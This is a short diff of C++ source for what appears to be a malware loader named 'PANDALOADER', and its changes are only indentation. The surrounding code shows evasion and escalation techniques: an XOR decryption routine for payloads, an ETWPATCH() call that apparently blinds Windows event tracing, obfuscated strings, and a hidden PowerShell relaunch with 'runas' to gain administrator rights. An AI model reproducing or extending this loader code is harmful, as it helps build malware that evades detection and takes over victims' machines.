@@ -315,10 +315,10 @@ void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
-    std::string exePath = get_executable_path();
-	std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
-	ETWPATCH();
-	if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
+   std::string exePath = get_executable_path();
+   std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
+   ETWPATCH();
+   if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
         LPCWSTR powershellPath = OBF(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
         WCHAR cmdLine[MAX_PATH];
 #ifdef __MINGW32__
@@ -331,7 +331,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
        ShellExecuteW(NULL, OBF(L"runas"), powershellPath, cmdLine, NULL, SW_HIDE);
        return 0;
     }
-	if (SINGLE_INSTANCE) {
+   if (SINGLE_INSTANCE) {
         HANDLE hMutex = CreateMutex(NULL, TRUE, OBF("PANDALOADER"));
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
         CloseHandle(hMutex);
